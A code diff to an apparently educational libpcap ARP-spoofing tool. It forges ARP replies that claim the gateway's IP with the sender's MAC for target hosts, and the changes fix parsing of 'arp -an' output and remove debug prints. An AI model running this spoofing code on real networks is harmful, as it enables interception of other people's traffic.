@@ -7,7 +7,7 @@
 #include "ethhdr.h"
 #include "arphdr.h"
 
-#define MAX_STR_SIZE 1024
+#define MAX_STR_SIZE 2048
 
 #pragma pack(push, 1)
 struct EthArpPacket final {
@@ -46,7 +46,6 @@ const char* getMACAddr(char *IP)
 
     pclose(fp);
 
-    printf("First pclose\n");
 
     if((fp=popen("arp -an","r"))==NULL)
     {
@@ -58,7 +57,7 @@ const char* getMACAddr(char *IP)
     char line[MAX_STR_SIZE];
     char* ptr;
 
-    while(fgets(line,MAX_STR_SIZE,fp)!=NULL)
+    while(fgets(line,MAX_STR_SIZE,fp)!=NULL)  //--------!only 1st line scan.!--------------
     {
         printf("%s\n",line);
         ptr = strtok(line," ");
@@ -67,12 +66,16 @@ const char* getMACAddr(char *IP)
             ptr = strtok(NULL," ");
 
             printf("%s\n",ptr);
-
-            if(!strncmp((ptr+1),IP,len))
+            if(strlen(ptr) > len)
             {
-                printf("IF : %s\n",ptr);
-                pclose(fp);
-                return ptr;
+                if(!strncmp((ptr+1),IP,len))
+                {
+                    printf("IF : %s\n",ptr);
+                    ptr = strtok(NULL," ");
+                    ptr = strtok(NULL," ");
+                    pclose(fp);
+                    return ptr;
+                }
             }
         }
         printf("while out\n");
@@ -114,10 +117,6 @@ const char* getGatewayAddr()
 void sendARP(char* dev, char* sender_IP, char* target_IP)
 {
 
-    printf("packet_lookup\n");
-
-    printf("%s %s %s\n",dev ,sender_IP, target_IP);
-
     char errbuf[PCAP_ERRBUF_SIZE];
     pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
     if (handle == nullptr) {
@@ -139,7 +138,7 @@ void sendARP(char* dev, char* sender_IP, char* target_IP)
     packet.arp_.pln_ = Ip::SIZE;
     packet.arp_.op_ = htons(ArpHdr::Reply);
     packet.arp_.smac_ = Mac(sender_MAC);   //me
-    packet.arp_.sip_ = htonl(Ip(getGatewayAddr()));        //gate
+    packet.arp_.sip_ = htonl(Ip(getGatewayAddr())); //gate
     packet.arp_.tmac_ = Mac(target_MAC);   //you
     packet.arp_.tip_ = htonl(Ip(target_IP));        //you
 
@@ -164,12 +163,10 @@ int main(int argc, char* argv[]) {
     }
 
     attackCase = (argc-2)/2;
-    //printf("%d",attackCase);
 
     for (i=0;i<attackCase;i++)
     {
-        //printf("%d %s %s %s",i ,argv[1] ,argv[2+i] ,argv[3+i]);
-        sendARP(argv[1],argv[2+i],argv[3+i]);     //segement fault
+        sendARP(argv[1],argv[2+i],argv[3+i]);
     }
 
 
